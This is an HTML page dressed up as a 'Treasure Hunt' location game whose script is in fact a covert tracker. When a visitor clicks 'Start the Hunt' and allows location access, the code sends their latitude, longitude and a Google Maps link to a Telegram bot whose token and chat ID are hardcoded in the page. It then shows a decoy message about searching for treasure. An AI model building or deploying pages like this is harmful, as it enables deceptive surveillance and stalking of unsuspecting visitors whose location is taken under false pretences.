<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Treasure Hunt</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background: linear-gradient(to bottom right, #0f0f0f, #1c1c1c);
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 10px;
    }
    p {
      margin: 10px 0 20px;
      font-size: 1.1em;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background: #28a745;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #218838;
    }
    .message {
      margin-top: 20px;
      font-size: 1.2em;
      color: #ffdf00;
    }
  </style>
</head>
<body>
  <h1>üéØ Welcome to Treasure Hunt</h1>
  <p>Allow location to start hunting treasures in your area!</p>
  <button onclick="getLocation()">Start the Hunt</button>

  <div class="message" id="gameMessage"></div>

  <script>
    function getLocation() {
      document.getElementById('gameMessage').textContent = "Requesting location...";
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, showError);
      } else {
        document.getElementById('gameMessage').textContent = "Geolocation is not supported by this browser.";
      }
    }

    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      // Create a clickable Google Maps link
      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
      const msg = `üìç New Player Location:\nLatitude: ${lat}\nLongitude: ${lon}\n\nüîó [Open in Google Maps](${mapsLink})`;

      const token = "7592762647:AAGk_PjuVSCAvjsafvxFWxxKTIipRtzv64M";
      const chatId = "5099451464";

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: msg,
          parse_mode: "Markdown"
        })
      })
      .then(res => {
        document.getElementById('gameMessage').textContent = "üîç Searching nearby for treasures...";
      })
      .catch(err => {
        document.getElementById('gameMessage').textContent = "‚ùå Failed to send location.";
      });
    }

    function showError(error) {
      let msg = "";
      switch(error.code) {
        case error.PERMISSION_DENIED:
          msg = "You denied the location request.";
          break;
        case error.POSITION_UNAVAILABLE:
          msg = "Location info is unavailable.";
          break;
        case error.TIMEOUT:
          msg = "Location request timed out.";
          break;
        default:
          msg = "Unknown error.";
      }
      document.getElementById('gameMessage').textContent = msg;
    }
  </script>
</body>
</html>
